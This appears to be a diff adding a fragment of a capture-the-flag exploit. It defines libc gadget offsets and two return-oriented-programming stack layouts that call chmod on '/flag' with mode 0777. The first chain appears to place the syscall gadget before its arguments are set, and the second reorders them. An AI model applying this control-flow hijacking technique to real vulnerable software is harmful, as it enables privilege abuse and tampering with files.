@@ -1,0 +1,23 @@
+
+pop_rdi = 0x023b6a
+pop_rsi = 0x02601f
+mov_eax = 0x10db64 #: mov eax, 0x5a ; syscall
+leave_ret = 0x578c8 #: leave ; ret
+
+rop_chain = {
+  new_rbp+8: libc_base + mov_eax,  #new_rbp here is rip = rbp+8
+  new_rbp+16:libc_base + pop_rdi,
+  new_rbp+24:  new_rbp + 48,
+  new_rbp+32: libc_base + pop_rsi,
+  new_rbp+40: 0o777,
+  new_rbp+48: b"/flag\0"
+}
+
+rop_chain2 = {
+  new_rbp+8: libc_base + pop_rdi, #new_rbp here is rip = rbp+8
+  new_rbp+16: new_rbp + 48,
+  new_rbp+24: libc_base + pop_rsi,
+  new_rbp+32: 0o777,
+  new_rbp+40: libc_base + mov_eax,
+  new_rbp+48: "/flag\0\0\0",
+}
